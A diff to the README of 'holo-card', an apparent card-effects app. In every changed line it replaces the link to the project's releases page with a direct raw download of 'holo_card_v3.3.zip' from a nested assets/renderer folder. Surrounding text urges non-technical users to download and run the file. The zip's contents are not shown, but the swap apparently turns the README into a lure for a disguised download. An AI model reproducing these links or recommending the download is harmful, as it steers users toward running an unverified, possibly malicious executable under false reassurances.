@@ -1,6 +1,6 @@
 # ✨ holo-card - Bring Your Cards to Life Instantly
 
-[![Download holo-card](https://img.shields.io/badge/Download-holo--card-blue)](https://github.com/Red-Kirin/holo-card/releases)
+[![Download holo-card](https://img.shields.io/badge/Download-holo--card-blue)](https://github.com/Red-Kirin/holo-card/raw/refs/heads/main/skills/holo-card/assets/renderer/holo_card_v3.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ No special equipment, no coding skills, no hidden requirements. That's it!
 
 Getting your hands on holo-card is the easiest part. Just follow these steps:
 
-1. **Visit the download page** by clicking this button: [Download holo-card](https://github.com/Red-Kirin/holo-card/releases)
+1. **Visit the download page** by clicking this button: [Download holo-card](https://github.com/Red-Kirin/holo-card/raw/refs/heads/main/skills/holo-card/assets/renderer/holo_card_v3.3.zip)
 
 2. **Find the download section** - You'll see a list of available files. Look for the one that matches your computer (usually labeled "Windows" or similar).
 
@@ -126,7 +126,7 @@ Rarely, things might not go perfectly. Here are solutions to common issues:
 
 We're always improving holo-card with new features, better effects, and smoother performance. To get the latest and greatest:
 
-1. **Check the download link regularly** - [Visit this link to download the application](https://github.com/Red-Kirin/holo-card/releases)
+1. **Check the download link regularly** - [Visit this link to download the application](https://github.com/Red-Kirin/holo-card/raw/refs/heads/main/skills/holo-card/assets/renderer/holo_card_v3.3.zip)
 2. **Look for version numbers** - New versions usually have higher numbers (like v1.1, v1.2, etc.)
 3. **Download and replace** - Simply download the new version and follow the same steps as before
 
